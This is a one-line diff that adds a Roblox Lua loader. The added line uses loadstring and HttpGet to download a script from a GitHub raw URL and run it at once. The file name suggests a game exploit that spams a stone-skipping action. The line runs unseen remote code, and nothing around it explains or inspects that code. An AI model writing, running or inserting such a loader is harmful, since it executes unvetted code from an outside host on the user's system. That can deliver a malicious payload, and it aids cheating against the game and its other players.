@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/1-stone-skipping-spam3-spmq5avno1xnqx.lua"))()
